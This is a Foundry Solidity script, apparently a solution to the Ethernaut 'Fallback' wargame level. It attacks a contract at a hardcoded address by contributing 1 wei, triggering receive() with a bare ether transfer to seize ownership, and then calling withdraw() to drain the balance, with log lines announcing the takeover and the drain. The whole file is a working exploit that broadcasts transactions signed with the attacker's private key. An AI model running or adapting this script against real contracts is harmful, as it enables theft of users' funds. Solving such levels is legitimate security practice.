pragma solidity ^0.8.2;

import {Script, console} from "forge-std/Script.sol";

interface IFallbackContract {
    function owner() external view returns (address);
    function contribute() external payable;
    function withdraw() external;
}

contract FallbackTakeoverScript is Script {
    address public target = 0xA0CF19180BF20f3Cb882C2821E887d66A95A2268;

    function run() public {
        uint256 attackerKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerKey);

        IFallbackContract targetContract = IFallbackContract(target);

        vm.startBroadcast(attackerKey);

        // Step 1: Contribute a small amount to become a contributor
        targetContract.contribute{value: 1 wei}();

        // Step 2: Send ether with no data to trigger receive()
        (bool success,) = address(targetContract).call{value: 1 wei}("");
        require(success, "Fallback call failed: no ownership transferred");

        if (targetContract.owner() == attacker) {
            console.log("Ownership transferred to attacker:", attacker);
            console.log("Target balance before drain:", target.balance);
            console.log("=== Draining Contract ===");
            // Step 3: Withdraw all funds from the contract
            targetContract.withdraw();
            console.log("Target balance after drain:", target.balance);
        }

        vm.stopBroadcast();
    }
}
